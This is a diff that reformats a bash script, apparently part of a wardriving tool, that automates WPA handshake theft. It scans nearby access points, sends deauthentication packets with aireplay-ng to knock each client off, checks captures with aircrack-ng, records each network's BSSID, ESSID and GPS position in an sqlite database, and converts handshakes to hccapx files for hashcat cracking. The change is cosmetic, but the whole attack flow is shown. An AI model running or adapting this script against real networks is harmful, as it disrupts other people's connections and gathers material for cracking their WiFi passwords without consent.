@@ -10,65 +10,64 @@
 
 # get platform
 if [ -d "/system" ]; then
-    device=0  # android
+  device=0 # android
 else
-    device=1  # linux
+  device=1 # linux
 fi
 
 airocheck() {
-	# checks a handshake (passed by file name) using aircrack-ng
-	# returns 1 on success and 0 on failure
-	for s in `ls "$1"*.cap 2>/dev/null`; do
-		if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | grep -c valid` -eq 0 ]; then
-			if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | awk '{print $NF}' | grep -c handshake` -ne 0 ]; then
-				cs=1
-			fi
-		fi
-	done
+  # checks a handshake (passed by file name) using aircrack-ng
+  # returns 1 on success and 0 on failure
+  for s in $(ls "$1"*.cap 2>/dev/null); do
+    if [ $("$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | grep -c valid) -eq 0 ]; then
+      if [ $("$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | awk '{print $NF}' | grep -c handshake) -ne 0 ]; then
+        cs=1
+      fi
+    fi
+  done
 }
 airekill() {
-	# kill all instances of aireplay-ng to prevent locking
-	for a in `pgrep $(basename "$AIREPLAY_BIN")`; do
-		kill -9 $a &>/dev/null
-	done
+  # kill all instances of aireplay-ng to prevent locking
+  for a in $(pgrep $(basename "$AIREPLAY_BIN")); do
+    kill -9 $a &>/dev/null
+  done
 }
 airokill() {
-	# kill all instances of airodump-ng to prevent locking
-	for a in `pgrep $(basename "$AIRODUMP_BIN")`; do
-		kill -9 $a &>/dev/null
-	done
+  # kill all instances of airodump-ng to prevent locking
+  for a in $(pgrep $(basename "$AIRODUMP_BIN")); do
+    kill -9 $a &>/dev/null
+  done
 }
 
 # enviro stuff
-WDIR=`realpath .`
+WDIR=$(realpath .)
 INTERFACE="wlan0"
-AIRCRACK_BIN=`which aircrack-ng`
-AIRODUMP_BIN=`which airodump-ng`
-AIREPLAY_BIN=`which aireplay-ng`
-SQLITE3_BIN=`which sqlite3`
-HC2HCX_BIN=`which wlanhc2hcx`
+AIRCRACK_BIN=$(which aircrack-ng)
+AIRODUMP_BIN=$(which airodump-ng)
+AIREPLAY_BIN=$(which aireplay-ng)
+SQLITE3_BIN=$(which sqlite3)
+HC2HCX_BIN=$(which wlanhc2hcx)
 
 if [ -z "$AIRCRACK_BIN" ]; then
-	echo "Make sure aircrack-ng is in your path!"
-	exit
+  echo "Make sure aircrack-ng is in your path!"
+  exit
 fi
 if [ -z "$AIRODUMP_BIN" ]; then
-	echo "Make sure airodump-ng is in your path!"
-	exit
+  echo "Make sure airodump-ng is in your path!"
+  exit
 fi
 if [ -z "$AIREPLAY_BIN" ]; then
-	echo "Make sure aireplay-ng is in your path!";
-	exit
+  echo "Make sure aireplay-ng is in your path!"
+  exit
 fi
 if [ -z "$SQLITE3_BIN" ]; then
-	echo "Make sure sqlite3 is in your path!";
-	exit
+  echo "Make sure sqlite3 is in your path!"
+  exit
 fi
 if [ -z "HC2HCX_BIN" ]; then
-	echo -e "Make sure the path to hcxtools' wlanhc2hcx is correct!\nhttps://github.com/ZerBea/hcxtools/blob/master/wlanhc2hcx.c";
-	exit
+  echo -e "Make sure the path to hcxtools' wlanhc2hcx is correct!\nhttps://github.com/ZerBea/hcxtools/blob/master/wlanhc2hcx.c"
+  exit
 fi
-
 
 # configure path variables
 path="$WDIR/"
@@ -95,90 +94,90 @@ rm -f "$path"*.cap &>/dev/null
 sleep 20
 airokill
 ctr=1
-`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' > "$path"ninitfile`
-ninit=`wc -l < "$path"ninitfile`
+$(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' >"$path"ninitfile)
+ninit=$(wc -l <"$path"ninitfile)
 rm -f "$path"ninitfile
 # level 1: access points (scan and apply filters)
-for i in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'`; do
-	c=`cat $path$init 2>/dev/null | tr -d ' ' | grep $i | awk -F ',' 'NR==1{print $4}'`
-	echo "_$ctr/$ninit    "
-	{ "$AIRODUMP_BIN" -c $c --bssid $i -w $path$i -o pcap $INTERFACE &>/dev/null; } &
-	sleep 2
-	if [ `cat "$path$bl" 2>/dev/null | grep -c $i` -gt 0 ]; then
-	# blacklisted access point
-		echo "-         "
-		airokill
-		ctr=$((ctr+1))
-		continue
-	fi
-	if [ `"$SQLITE3_BIN" "$path$db" "SELECT * FROM hs WHERE bssid='$i'" 2>/dev/null | grep -c $i` -gt 0 ]; then
-	# handshake for access point present in database
-		echo "x         "
-		airokill
-		ctr=$((ctr+1))
-		continue
-	fi
-	if [ `ls "$path$i"*.cap 2>/dev/null | grep -c cap` -eq 0 ]; then
-	# access point is not reachable anymore
-		echo "?         "
-		airokill
-		ctr=$((ctr+1))
-		continue
-	fi
-	ctr2=1
-	`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' > "$path"nairofile`
-	nairo=`wc -l < "$path"nairofile`
-	rm -f "$path"nairofile
-	# level 2: deauthenticate clients and try to capture handshake
-	for j in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'`; do
-		curbssid=`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}'`
-		if [ "$curbssid" == "$i" ]; then
-			echo "__$ctr2/$nairo    "
-			# send a single deauth packet
-			{ "$AIREPLAY_BIN" -0 1 -a $i -c $j -F $INTERFACE &>/dev/null; } &
-			sleep 5
-			cs=0
-			airocheck "$path$i"
-			if [ $cs -eq 1 ]; then
-				airekill
-				break
-			fi
-			airekill
-			ctr2=$((ctr2+1))
-		else
-			ctr2=$((ctr2+1))
-		fi
-	done
-	sleep 5
-	airokill
-	ctr=$((ctr+1))
+for i in $(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'); do
+  c=$(cat $path$init 2>/dev/null | tr -d ' ' | grep $i | awk -F ',' 'NR==1{print $4}')
+  echo "_$ctr/$ninit    "
+  { "$AIRODUMP_BIN" -c $c --bssid $i -w $path$i -o pcap $INTERFACE &>/dev/null; } &
+  sleep 2
+  if [ $(cat "$path$bl" 2>/dev/null | grep -c $i) -gt 0 ]; then
+    # blacklisted access point
+    echo "-         "
+    airokill
+    ctr=$((ctr + 1))
+    continue
+  fi
+  if [ $("$SQLITE3_BIN" "$path$db" "SELECT * FROM hs WHERE bssid='$i'" 2>/dev/null | grep -c $i) -gt 0 ]; then
+    # handshake for access point present in database
+    echo "x         "
+    airokill
+    ctr=$((ctr + 1))
+    continue
+  fi
+  if [ $(ls "$path$i"*.cap 2>/dev/null | grep -c cap) -eq 0 ]; then
+    # access point is not reachable anymore
+    echo "?         "
+    airokill
+    ctr=$((ctr + 1))
+    continue
+  fi
+  ctr2=1
+  $(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' >"$path"nairofile)
+  nairo=$(wc -l <"$path"nairofile)
+  rm -f "$path"nairofile
+  # level 2: deauthenticate clients and try to capture handshake
+  for j in $(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'); do
+    curbssid=$(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}')
+    if [ "$curbssid" == "$i" ]; then
+      echo "__$ctr2/$nairo    "
+      # send a single deauth packet
+      { "$AIREPLAY_BIN" -0 1 -a $i -c $j -F $INTERFACE &>/dev/null; } &
+      sleep 5
+      cs=0
+      airocheck "$path$i"
+      if [ $cs -eq 1 ]; then
+        airekill
+        break
+      fi
+      airekill
+      ctr2=$((ctr2 + 1))
+    else
+      ctr2=$((ctr2 + 1))
+    fi
+  done
+  sleep 5
+  airokill
+  ctr=$((ctr + 1))
 done
 rm -f "$path"initlist*
 ctr3=0
 # finalize by inserting data for captured handshakes into database
 # and converting the .pcap to a .hccapx file for use with hashcat
-for h in `ls "$path"*.cap 2>/dev/null`; do
-	if [ `"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep -c valid` -eq 0 ]; then
-		airstr=`"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep handshake`
-		getloc=`cat "$path$loc"*.txt 2>/dev/null | sed '2q;d'`
-		if [ `echo "$airstr" | grep -c handshake` -eq 0 ]; then
-			rm -f "$h"
-		else
-			b=`echo "$airstr" | awk '{print $2}'`
-			e=`echo "$airstr" | awk '{for (F=3;F<=NF-3;++F) printf " %s", ($F)}'`
-			e=${e:1:${#e}}
-			lat=`echo "$getloc" | awk -F ',' '{print $2}'`
-			lon=`echo "$getloc" | awk -F ',' '{print $3}'`
-			"$SQLITE3_BIN" "$path$db" "INSERT INTO hs(lat, lon, bssid, essid) VALUES('$lat', '$lon', '$b', '$e');" 2>/dev/null
-			"$AIRCRACK_BIN" "$h" -J "$h" &>/dev/null
-			"$HC2HCX_BIN" -o "$path$hs$b".hccapx "$h".hccap &>/dev/null
-			mv "$h" "$path$hs"
-			rm -f "$h".hccap
-			ctr3=$((ctr3+1))
-		fi
-	else
-		rm -f "$h"
-	fi
+for h in $(ls "$path"*.cap 2>/dev/null); do
+  if [ $("$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep -c valid) -eq 0 ]; then
+    airstr=$("$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep handshake)
+    getloc=$(cat "$path$loc"*.txt 2>/dev/null | sed '2q;d')
+    if [ $(echo "$airstr" | grep -c handshake) -eq 0 ]; then
+      rm -f "$h"
+    else
+      b=$(echo "$airstr" | awk '{print $2}')
+      e=$(echo "$airstr" | awk '{for (F=3;F<=NF-3;++F) printf " %s", ($F)}')
+      e=${e:1:${#e}}
+      lat=$(echo "$getloc" | awk -F ',' '{print $2}')
+      lon=$(echo "$getloc" | awk -F ',' '{print $3}')
+      "$SQLITE3_BIN" "$path$db" "INSERT INTO hs(lat, lon, bssid, essid) VALUES('$lat', '$lon', '$b', '$e');" 2>/dev/null
+      "$AIRCRACK_BIN" "$h" -J "$h" &>/dev/null
+      "$HC2HCX_BIN" -o "$path$hs$b".hccapx "$h".hccap &>/dev/null
+      mv "$h" "$path$hs"
+      rm -f "$h".hccap
+      ctr3=$((ctr3 + 1))
+    fi
+  else
+    rm -f "$h"
+  fi
 done
 echo "_______"
 echo "$ctr3!"
